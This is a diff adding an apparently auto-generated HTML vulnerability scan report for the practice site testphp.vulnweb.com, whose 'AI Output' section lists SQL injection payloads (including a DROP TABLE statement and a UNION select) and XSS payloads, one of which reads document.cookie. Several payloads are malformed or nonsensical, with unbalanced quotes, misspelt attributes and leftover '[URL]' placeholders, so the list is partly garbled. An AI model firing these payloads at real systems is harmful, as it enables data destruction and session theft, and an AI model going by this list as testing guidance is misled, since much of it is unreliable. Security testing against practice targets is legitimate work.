@@ -1,0 +1,22 @@
+<h1>AI Vulnerability Scan Report</h1><p><strong>Target:</strong> http://testphp.vulnweb.com/</p><p><strong>Generated:</strong> 2025-04-23_00-49-52</p><hr><h2>Form: http://testphp.vulnweb.com/search.php?test=query</h2><p>Method: post</p><p>Inputs: searchFor, goButton</p><details><summary><strong>AI Output</strong></summary><pre>SQLi Payloads (Replace `YOUR_QUERY` with the actual query):
+```sql
+- ' OR 'a'='/
+- '; YOUR_QUERY--
+- "'; DROP TABLE Students; --'"
+- "' union all select null, null, null, null --"
+- '%') or (1=2)--"
+- ") and (1=1); --"
+- ' OR 1<=0'
+```
+
+XSS Payloads:
+```html
+- <script>alert(String)</script>
+- <img src="broken.php?e=on">
+- <div vatlue onmouseover="alert('xss')"></div>
+- '<svg><use xlink:href="#underscore" xml:space="default"><a tabindex="0" onclick="_contextualLink(this, '_blank', '[URL]'); return false;" href="/about/">' (replace [URL] with the actual URL)</a></use></svg>
+- <div onmouseover="var _0x8e3d=['','xss'];document.body.appendChild(_0x8e3d[0]+String(_0x8e3d[1]))">(javascript:alert('XSS'))</div>
+- "<svg><use xlink:href="#underscore" xml:space="default"><a tabindex="0" onclick='document.getElementById("__react_owner_read_only_hydration_checksum").value = "xss"; return false;' href="/about/"> (replace [URL] with the actual URL)</a></use></svg>"
+- "<div onmouseover="javascript:alert(document.cookie)" style='background:url(broken.php?e=on)'>"
+- '<img src="broken.php?e=on">' (replace [URL] with the actual URL where script tag is not allowed or expected to execute correctly)
+```</pre></details>
